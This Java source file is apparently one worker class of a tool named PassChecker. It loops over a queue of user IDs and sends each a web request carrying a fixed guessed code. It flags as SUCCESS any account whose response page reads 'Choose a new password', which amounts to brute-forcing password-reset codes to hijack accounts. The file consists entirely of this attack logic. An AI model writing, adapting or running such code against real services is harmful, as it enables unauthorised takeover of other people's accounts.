import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import org.apache.commons.codec.binary.Base64;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.Future;

/**
 * Created by gurkiratsingh on 7/8/16.
 */
public class Worker extends Thread implements Cred{
    protected BlockingQueue<String> queue;

    public Worker(BlockingQueue<String> q){
        this.queue = q;
    }

    public void run(){
        try {

            while (!queue.isEmpty()) {
                String user_id = queue.take();

                String url = String.format("%su=%s&n=%d", PassChecker.BASE_URL, user_id, PassChecker.GUESS);
                HttpResponse<String> response = Unirest.get(url).asString();
                Document htmldoc = Jsoup.parse(response.getBody());
                String title = htmldoc.body().getElementsByTag("h2").last().text();

                PassChecker.counter++;
                if (title.equalsIgnoreCase("Choose a new password")){
                    System.out.println("---------------------------SUCCESS---------------------------");
                    System.out.println(user_id);
                    System.out.println("---------------------------SUCCESS---------------------------");
                }else{
                    System.out.println(title + ": " + user_id + " " + PassChecker.counter);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
